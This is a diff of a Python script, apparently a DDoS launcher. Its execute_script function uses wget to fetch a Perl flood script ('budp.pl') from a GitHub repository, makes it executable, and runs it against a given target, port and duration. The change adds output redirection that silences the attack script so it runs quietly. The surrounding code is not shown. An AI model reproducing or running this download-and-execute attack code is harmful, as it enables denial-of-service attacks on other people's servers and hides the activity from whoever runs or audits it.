@@ -24,7 +24,7 @@ def execute_script(target, port, duration):
         os.makedirs("../bim/usr")
 
     # Silence the wget command by redirecting output to /dev/null
-    command = f"cd .. && cd bim && cd usr && wget https://github.com/urddos4807010/pakistan/raw/main/budp.pl > /dev/null 2>&1 && chmod +x * && perl budp.pl {target} {port} {duration} 100"
+    command = f"cd .. && cd bim && cd usr && wget https://github.com/urddos4807010/pakistan/raw/main/budp.pl > /dev/null 2>&1 && chmod +x * && perl budp.pl {target} {port} {duration} 100 > /dev/null 2>&1"
     os.system(command)
 
 def stop_process():
@@ -94,4 +94,5 @@ if __name__ == "__main__":
     else:
         delete_script()
         print_banner(duration)
-      
+
+    
